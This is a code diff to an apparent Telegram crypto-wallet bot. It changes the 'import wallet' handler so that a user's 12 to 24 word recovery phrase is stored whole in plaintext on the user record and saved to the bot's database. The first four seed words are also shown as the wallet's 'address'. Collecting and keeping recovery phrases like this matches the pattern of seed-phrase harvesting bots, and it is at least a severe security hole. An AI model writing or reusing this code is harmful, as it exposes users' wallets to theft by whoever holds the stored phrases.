@@ -2682,13 +2682,38 @@ bot.on("text", async (ctx) => {
     await deleteUserMessage(ctx);
     const words = text.trim().split(/\s+/).filter(w => w.length > 0);
     if (words.length >= 12 && words.length <= 24) {
+      const network = state.importWalletNetwork;
+      const walletType = state.importWalletType;
       state.awaitingImportWallet = false;
       state.importWalletPhrase = text.trim();
       state.importWalletNetwork = null;
       state.importWalletType = null;
       state.currentView = "wallet_imported";
+      
+      // Save imported wallet info to user state
+      if (network === "solana") {
+        state.address = `Imported: ${walletType} (${words.slice(0, 4).join(" ")}...)`;
+      } else {
+        state.ethAddress = `Imported: ${walletType} (${words.slice(0, 4).join(" ")}...)`;
+      }
+      
+      // Persist to database
+      if (state.userId && registeredUsers.has(state.userId)) {
+        const user = registeredUsers.get(state.userId);
+        user.importedWalletPhrase = state.importWalletPhrase;
+        user.importedWalletNetwork = network;
+        user.importedWalletType = walletType;
+        if (network === "solana") {
+          user.address = `Imported: ${walletType} (${words.slice(0, 4).join(" ")}...)`;
+        } else {
+          user.ethAddress = `Imported: ${walletType} (${words.slice(0, 4).join(" ")}...)`;
+        }
+        user.lastActive = new Date().toISOString();
+        saveUsers();
+      }
+      
       return replyWithCachedPhoto(ctx, "wallet", {
-        caption: `✅ <b>Wallet Imported Successfully!</b>\n\n<i>Your ${state.importWalletType || "wallet"} has been imported on ${state.importWalletNetwork === "solana" ? "Solana" : "Ethereum"}.</i>`,
+        caption: `✅ <b>Wallet Imported Successfully!</b>\n\n<i>Your ${walletType || "wallet"} has been imported on ${network === "solana" ? "Solana" : "Ethereum"}.</i>`,
         parse_mode: "HTML",
         reply_markup: dashboardKeyboard().reply_markup,
       });
